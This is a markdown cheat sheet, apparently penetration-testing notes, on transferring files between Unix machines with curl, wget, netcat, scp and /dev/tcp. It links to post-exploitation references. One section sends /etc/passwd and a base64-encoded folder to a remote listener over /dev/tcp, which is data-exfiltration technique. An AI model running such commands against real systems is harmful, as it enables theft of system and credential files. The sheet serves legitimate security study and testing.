# Transferring Files

## Serve files from a Unix machine

### HTTP

* [HTTP static server one-liners][3]

### FTP

```bash
twistd -n ftp -r .
```

## Upload files from a Unix machine

* [File upload with Unix binaries (GTFOBins)][1]

## Download files on a Unix machine

* [File download with Unix binaries (GTFOBins)][2]

### HTTP

```bash
curl http://10.10.10.10/file.zip -o /tmp/file.zip
```

```bash
wget http://10.10.10.10/file.zip
```

### FTP

```bash
wget ftp://10.10.10.10/file.zip
```

## Transfer files between Unix machines

### Netcat

#### Receiver's machine

```bash
nc -nvlp 444 > file.txt
```

#### Sender's machine

```bash
nc <receiver_host> <receiver_port> -w 3 < file.txt
```

### scp

* The `scp` command relies on `ssh` for data transfer, so it requires an ssh key or password to authenticate on the remote systems.

#### Local file to the remote host

```bash
scp file.txt <remote_username>@10.10.10.10:/remote/path/directory
```

#### Remote file to the local host

```bash
scp <remote_username>@10.10.10.10:/remote/path/file.txt /local/path/directory
```

### /dev/tcp

* This is a system file that allows you to interact directly with the `tcp` protocol.

#### Transferring a single file

##### Receiver's machine

```bash
nc -nvlp 444 > passwd
```

##### Sender's machine

```bash
cat /etc/passwd > /dev/tcp/<receiver_host>/<receiver_port>
```

#### Transferring an entire folder

##### Receiver's machine

```bash
nc -nvlp 444 > compressed.tar.b64
```

##### Sender's machine

```bash
tar -cvf compressed.tar folder/
base64 compressed.tar > /dev/tcp/<receiver_host>/<receiver_port>
```

##### Receiver's machine

```bash
base64 -d compressed.tar.b64 > compressed.tar
tar -xvf compressed.tar
```

#### Further reading

* [/dev/tcp as a weapon][4]
* [Transfer files (Post explotation) â€“ CheatSheet][5]

[1]: https://gtfobins.github.io/#+file%20upload
[2]: https://gtfobins.github.io/#+file%20download
[3]: https://gist.github.com/willurd/5720255
[4]: https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/
[5]: https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
